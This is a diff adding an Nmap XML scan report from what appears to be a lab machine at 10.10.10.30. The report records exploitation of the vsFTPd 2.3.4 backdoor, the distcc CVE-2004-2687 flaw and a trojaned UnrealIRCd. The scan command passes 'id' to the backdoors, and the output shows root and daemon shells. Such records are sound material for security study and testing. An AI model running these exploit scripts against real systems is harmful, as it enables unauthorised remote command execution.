@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE nmaprun>
+<?xml-stylesheet href="file:///usr/share/nmap/nmap.xsl" type="text/xsl"?>
+<!-- Nmap 7.99 scan initiated Thu Nov 12 10:40:01 2026 as: /usr/lib/nmap/nmap -p 21,3632,6667 -&#45;script ftp-vsftpd-backdoor,distcc-cve2004-2687,irc-unrealircd-backdoor -&#45;script-args distcc-cve2004-2687.cmd=id,ftp-vsftpd-backdoor.cmd=id -oA /home/kali/vuln/p8-02-backdoors 10.10.10.30 -->
+<nmaprun scanner="nmap" args="/usr/lib/nmap/nmap -p 21,3632,6667 -&#45;script ftp-vsftpd-backdoor,distcc-cve2004-2687,irc-unrealircd-backdoor -&#45;script-args distcc-cve2004-2687.cmd=id,ftp-vsftpd-backdoor.cmd=id -oA /home/kali/vuln/p8-02-backdoors 10.10.10.30" start="1794480001" startstr="Thu Nov 12 10:40:01 2026" version="7.99" xmloutputversion="1.05">
+<scaninfo type="syn" protocol="tcp" numservices="3" services="21,3632,6667"/>
+<verbose level="0"/>
+<debugging level="0"/>
+<hosthint><status state="up" reason="arp-response" reason_ttl="0"/>
+<address addr="10.10.10.30" addrtype="ipv4"/>
+<address addr="08:00:27:4B:14:1A" addrtype="mac" vendor="Oracle VirtualBox virtual NIC"/>
+<hostnames>
+</hostnames>
+</hosthint>
+<host starttime="1794480001" endtime="1794480041"><status state="up" reason="arp-response" reason_ttl="0"/>
+<address addr="10.10.10.30" addrtype="ipv4"/>
+<address addr="08:00:27:4B:14:1A" addrtype="mac" vendor="Oracle VirtualBox virtual NIC"/>
+<hostnames>
+</hostnames>
+<ports><port protocol="tcp" portid="21"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="ftp" method="table" conf="3"/><script id="ftp-vsftpd-backdoor" output="&#xa;  VULNERABLE:&#xa;  vsFTPd version 2.3.4 backdoor&#xa;    State: VULNERABLE (Exploitable)&#xa;    IDs:  CVE:CVE-2011-2523  BID:48539&#xa;      vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.&#xa;    Disclosure date: 2011-07-03&#xa;    Exploit results:&#xa;      Shell command: id&#xa;      Results: uid=0(root) gid=0(root)&#xa;    References:&#xa;      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb&#xa;      https://www.securityfocus.com/bid/48539&#xa;      http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html&#xa;      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523&#xa;"><table key="CVE-2011-2523">
+<elem key="title">vsFTPd version 2.3.4 backdoor</elem>
+<elem key="state">VULNERABLE (Exploitable)</elem>
+<table key="ids">
+<elem>CVE:CVE-2011-2523</elem>
+<elem>BID:48539</elem>
+</table>
+<table key="description">
+<elem>vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.</elem>
+</table>
+<table key="dates">
+<table key="disclosure">
+<elem key="day">03</elem>
+<elem key="year">2011</elem>
+<elem key="month">07</elem>
+</table>
+</table>
+<elem key="disclosure">2011-07-03</elem>
+<table key="exploit_results">
+<elem>Shell command: id</elem>
+<elem>Results: uid=0(root) gid=0(root)</elem>
+</table>
+<table key="refs">
+<elem>https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb</elem>
+<elem>https://www.securityfocus.com/bid/48539</elem>
+<elem>http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</elem>
+<elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523</elem>
+</table>
+</table>
+</script></port>
+<port protocol="tcp" portid="3632"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="distccd" method="table" conf="3"/><script id="distcc-cve2004-2687" output="&#xa;  VULNERABLE:&#xa;  distcc Daemon Command Execution&#xa;    State: VULNERABLE (Exploitable)&#xa;    IDs:  CVE:CVE-2004-2687&#xa;    Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)&#xa;      Allows executing of arbitrary commands on systems running distccd 3.1 and&#xa;      earlier. The vulnerability is the consequence of weak service configuration.&#xa;      &#xa;    Disclosure date: 2002-02-01&#xa;    Extra information:&#xa;      &#xa;    uid=1(daemon) gid=1(daemon) groups=1(daemon)&#xa;  &#xa;    References:&#xa;      https://nvd.nist.gov/vuln/detail/CVE-2004-2687&#xa;      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687&#xa;      https://distcc.github.io/security.html&#xa;"><table key="CVE-2004-2687">
+<elem key="title">distcc Daemon Command Execution</elem>
+<elem key="state">VULNERABLE (Exploitable)</elem>
+<table key="ids">
+<elem>CVE:CVE-2004-2687</elem>
+</table>
+<table key="scores">
+<elem key="CVSSv2">9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)</elem>
+</table>
+<table key="description">
+<elem>Allows executing of arbitrary commands on systems running distccd 3.1 and&#xa;earlier. The vulnerability is the consequence of weak service configuration.&#xa;</elem>
+</table>
+<table key="dates">
+<table key="disclosure">
+<elem key="day">01</elem>
+<elem key="year">2002</elem>
+<elem key="month">02</elem>
+</table>
+</table>
+<elem key="disclosure">2002-02-01</elem>
+<table key="exploit_results">
+</table>
+<table key="extra_info">
+<elem>&#xa;  uid=1(daemon) gid=1(daemon) groups=1(daemon)&#xa;</elem>
+</table>
+<table key="refs">
+<elem>https://nvd.nist.gov/vuln/detail/CVE-2004-2687</elem>
+<elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687</elem>
+<elem>https://distcc.github.io/security.html</elem>
+</table>
+</table>
+</script></port>
+<port protocol="tcp" portid="6667"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="irc" method="table" conf="3"/><script id="irc-unrealircd-backdoor" output="Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277"/></port>
+</ports>
+<times srtt="634" rttvar="2144" to="100000"/>
+</host>
+<runstats><finished time="1794480041" timestr="Thu Nov 12 10:40:41 2026" summary="Nmap done at Thu Nov 12 10:40:41 2026; 1 IP address (1 host up) scanned in 40.49 seconds" elapsed="40.49" exit="success"/><hosts up="1" down="0" total="1"/>
+</runstats>
+</nmaprun>
